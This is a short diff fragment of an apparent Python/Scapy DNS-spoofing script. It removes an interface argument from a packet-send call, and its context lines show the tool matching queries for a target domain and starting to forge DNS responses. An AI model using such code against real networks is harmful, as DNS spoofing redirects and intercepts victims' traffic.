@@ -68,7 +68,7 @@ def dns_spoof(pkt):
             oip = pkt.getlayer(IP)
             oudp = pkt.getlayer(UDP)
             p = eht / ip / icmp / oip / oudp
-            sendp(p, iface="Ethernet0", verbose=0)
+            sendp(p, verbose=0)
         if target_domain in pkt[DNS].qd.qname.decode():
             print(f"Spoofing DNS request for {target_domain}")
             # Construct the DNS response
